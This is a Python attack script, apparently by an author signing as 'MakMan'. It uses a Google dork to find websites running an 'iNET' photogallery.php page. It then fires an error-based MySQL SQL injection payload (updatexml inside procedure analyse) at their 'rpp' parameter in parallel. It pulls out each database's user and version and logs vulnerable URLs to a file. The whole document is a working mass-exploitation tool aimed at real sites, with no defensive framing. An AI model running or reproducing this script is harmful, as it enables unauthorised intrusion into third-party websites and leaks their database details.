#Make sure makman.py is in the same directory
from  makman       import *
from  urllib.parse import urlparse
from  time         import time as timer


def inject( u ):
    #Payload with Injection Query
    payload = { 'extentions' : '1', 'rpp' : '1 /*!00000procedure analyse( updatexml(null,concat (0x3a,user(),0x3a,version()),null),1)*/' }
    #Formating our URL properly
    o       = urlparse(u)
    url     = o.scheme + '://' + o.netloc + o.path
    try:
        r   = requests.get( url, params = payload )
        if 'XPATH syntax error' in r.text:
            return url + ':' + re.search( "XPATH syntax error: ':(.+?)'", r.text ).group(1)
        else:
            return url + ':' + 'Not Vulnerable'
    except:
        return url + ':' + 'Bad Response'


def main():
    start         = timer()
    #Calling dork_scanner from makman.py for 15 pages and 4 parallel processes
    search_result = dork_scanner( 'intext:Developed by : iNET inurl:photogallery.php', '15', '4' )
    file_string   = '######## By MakMan ########\n'
    final_result  = []
    count         = 0
    #Running 8 parallel processes for the exploitation
    with Pool(8) as p:
        final_result.extend( p.map( inject, search_result ) )
    for i in final_result:
        if not 'Not Vulnerable' in i and not 'Bad Response' in i:
            count += 1
            print ( '------------------------------------------------\n')
            print ( 'Url     : http:' + i.split(':')[1]                      )
            print ( 'User    : '      + i.split(':')[2]                      )
            print ( 'Version : '      + i.split(':')[3]                      )
            print ( '------------------------------------------------\n')
            file_string = file_string + 'http:' + i.split(':')[1] + '\n' + i.split(':')[2] + '\n' + i.split(':')[3] + '\n\n\n'
    #Writing vulnerable URLs in a file makman.txt
    with open( 'makman.txt', 'a', encoding = 'utf-8' ) as file:
        file.write( file_string )
    print( 'Total URLs Scanned    : %s' % len( search_result ) )
    print( 'Vulnerable URLs Found : %s' % count )
    print( 'Script Execution Time : %s' % ( timer() - start, ) )


if __name__ == '__main__':
    main()


#End
